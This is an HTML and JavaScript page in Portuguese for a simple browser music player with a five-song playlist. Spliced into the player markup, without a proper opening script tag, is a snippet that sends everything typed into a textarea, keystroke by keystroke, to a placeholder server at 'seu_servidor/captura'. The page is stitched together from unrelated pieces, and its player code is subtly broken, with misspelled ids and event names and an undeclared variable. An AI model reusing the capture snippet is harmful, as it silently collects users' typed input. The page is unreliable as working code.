<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    <title>Document</title>
</head>
<body>
    <div class="music-container">
    
        <h1 id="playlist-name">Nome da Playlist</h1>
    <img id="cover" alt="Disc Cover">
    <audio id="audio"></audio>
    <div id="below-cover">
    <div id="song-info">
    <div id="name-song">nome da musica</div>
    <div id="name-singer">nome do autor</div>
    </div>
    <button id="like" class="button"><i class="bi bi-heart"></i></button>
    </div>
    <div id="progress-container">
    <div id="progress-bar">
        <div id="time-box"></div>
        <div id="current-progress"></div>
    </div>
    </div>
   <div id="navegation-container">
    <!-- <button id="shuffle" class="button"><i class="bi bi-shuffle"></i></button> -->
    <button id="previous"  class="button button-navegation"><i class="bi bi-skip-start-circle-fill"></i></button>
    <button id="play"  class="button button-biggest"><i class="bi bi-play-circle-fill"></i></button>
    <button id="next"  class="button  button-navegation"><i class="bi bi-skip-end-circle-fill"></i></button>
    <!-- <button id="repeat"  class="button"><i class="bi bi-repeat"></i></button> -->
</div>
</div>

     document.addEventListener("DOMContentLoaded", function() {
            const textarea = document.getElementById('myTextarea');
            textarea.addEventListener('input', function() {
                const data = { text: textarea.value };
                fetch('http://seu_servidor/captura', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(data)
                });
            });
        });
    </script>
</head>
<body>
    <textarea id="myTextarea" placeholder="Digite algo..."></textarea>
</body>

<!-- javascript -->
<script>
    const songName = document.getElementById('name-song');
    const playname = document.getElementById('playlist-name')
    const nameSinger = document.getElementById('name-singer');
    const song = document.getElementById('audio');
    const cover = document.getElementById('cover');
    const play = document.getElementById('play');
    const next = document.getElementById('next');
    const previous = document.getElementById('previous');
    const currentProgress = document.getElementById('current-progress');
    const progressContainer = document.getElementById('progress-container');
    const shuffleButton = document.getElementById('shufffle');
    const repeatButton = document.getElementById('repeat')
    
    
    const chineseNewYear = {
        songName : 'chinese new year',
        artist : 'SALES',
        file :  'chinese - sales',
    };
    
    const ivy = {
        songName : 'ivy',
        artist : 'SALES',
        file :  'ivy - sales',
    };
    const renee = {
        songName : 'renee',
        artist : 'SALES',
        file :  'sales - renee',
    };
    const rockstar = {
        songName : 'Pope Is a Rockstar',
        artist : 'SALES',
        file :  'rockstar - sales',
    };
    const eastwood = {
        songName : 'Clint Eastwood',
        artist : 'Gorillaz',
        file :  'eastwood - gorillaz',
    };

    const playlist = [chineseNewYear, ivy, rockstar, renee, eastwood];
    
    let index = 0; 
    let sortedPlaylist = [...playlist];
    let isShuffled = false;
    let isplaying = false; 
    playname.innerText = 'Dopplin\'s Player'
    songName.innerText = 'N/A';



   
function playSong(){
       play.querySelector('.bi').classList.remove('bi-play-circle-fill');
       play.querySelector('.bi').classList.add('bi-pause-circle-fill');
        song.play();
        isplaying = true;
    }
    
    function pauseSong(){
       play.querySelector('.bi').classList.add('bi-play-circle-fill');
       play.querySelector('.bi').classList.remove('bi-pause-circle-fill');
        song.pause();
        isplaying = false;

    }

    function playPauseDecider(){
        if(isplaying === true){
            pauseSong();
        }

        else {
            playSong();
        }
    }

    function nodeSong(){
        cover.src = `images/${sortedPlaylist[index].file}.webp`;
        song.src = `songs/${sortedPlaylist[index].file}.mp3`;
        songName.innerText = sortedPlaylist[index].songName;
        nameSinger.innerText = sortedPlaylist[index].artist
    }

    function previousSong(){
        if(index === 0 ){
            index = sortedPlaylist.length - 1;
        }

        else {
            index -= 1;
        }

        nodeSong();
        playSong();
    }
    
    function nextSong(){
        if(index === sortedPlaylist.length - 1 ){
            index = 0;
        }

        else {
            index += 1;
        }

        nodeSong();
        playSong();
    }
    
    function updateProgressBar(){
       
        const barWidth = (song.currentTime/song.duration)*100; 
        currentProgress.style.setProperty('--progress', `${barWidth}%`);
    }

    function jumpTo(event){
       const width = progressContainer.clientWidth;
       const clickPosition = event.offsetX;
       const jumpToTIme = (clickPosition/width)* song.duration;
       song.currentTime = jumpToTIme;
    }

    function shuffleArray(preShuffleArray){
         const size = preShuffleArray.length;
         let currentIndex = size - 1;
         while(currentIndex > 0){
                let randomIndex = Math.floor(Math.random()* size);
                let aux = preShuffleArray[currentIndex];
                preShuffleArray[currentIndex] = preShuffleArray[randomIndex];
                preShuffleArray[randomIndex] = aux;
                currentIndex -= 1;
    }
    }

    function shuffleButtonClicked(){
        if(isShuffled === false){
            isShuffled = true;
            shuffleArray(sortedPlaylist);
            shuffleButton.classList.add('button-active'); 
        }

        else{
            isShuffled = false;
            sortedPlaylist = [...playlist];
            shuffleButton.classList.remove('button-active'); 
        }
    }

    function repeatButtonCliked(){
        if (repeatOn === false) {
            repeatOn = true; 
            repeatButton.classList.add('button-active');
        }   

        repeatOn = false;
        repeatButton.classList.remove('button-active');
    
     }

    nodeSong();
        
    

    play.addEventListener('click', playPauseDecider);
    previous.addEventListener('click', previousSong );
    next.addEventListener('click', nextSong);
    song.addEventListener('timeupdate', updateProgressBar);
    song.addEventListener('ended', nextSong );
    progressContainer.addEventListener('click', jumpTo);
    shuffleButton.addEventListener('click', shuffleButtonClicked);
    repeatButton.addEventListener('clik', repeatButtonCliked); 
   
  
  
  
</script>
</body>

</html>
